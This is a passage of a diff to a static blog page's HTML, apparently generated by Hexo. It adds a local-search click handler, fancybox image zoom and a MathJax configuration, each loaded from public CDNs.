+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+  
+
+  
+    <!-- MathJax -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+          tex2jax: {
+              inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+              processEscapes: true,
+              skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+          }
+      });
+
+      MathJax.Hub.Queue(function() {
+          var all = MathJax.Hub.getAllJax(), i;
+          for(i=0; i < all.length; i += 1) {
+              all[i].SourceElement().parentNode.className += ' has-jax';
+          }
+      });
+
+    </script>
+
+    <script src="https://cdn.staticfile.org/mathjax/2.7.7/MathJax.js?config=TeX-MML-AM_CHTML"></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
 <script type="text/x-mathjax-config">
   MathJax.Hub.Config("");
 </script>
@@ -453,5 +1247,17 @@
 </script>
 <!-- End: Injected MathJax -->
 <!-- hexo-inject:end -->
+
+  
+
+
+
+
+
+
+
+
+
+
 </body>
 </html>
